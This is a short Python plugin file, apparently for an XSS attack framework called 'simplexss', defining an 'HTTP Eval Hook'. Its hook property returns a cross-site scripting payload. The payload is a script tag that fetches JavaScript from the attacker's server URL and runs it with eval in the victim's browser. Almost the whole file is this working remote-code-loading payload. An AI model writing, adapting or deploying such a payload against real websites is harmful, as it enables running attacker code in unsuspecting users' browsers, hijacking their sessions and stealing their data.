from simplexss.api.hooks import BaseHook


class Hook(BaseHook):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'HTTP Eval hook. '
    NAME = 'HTTP Eval Hook'
    VERSION = '0.0.1'
    TRANSPORTS = (
        'Default HTTP Transport',
    )

    @property
    def hook(self) -> str:
        return f'<script>fetch("{self.environment.url}/.js").then(r => r.text().then(t => eval(t)))</script>'
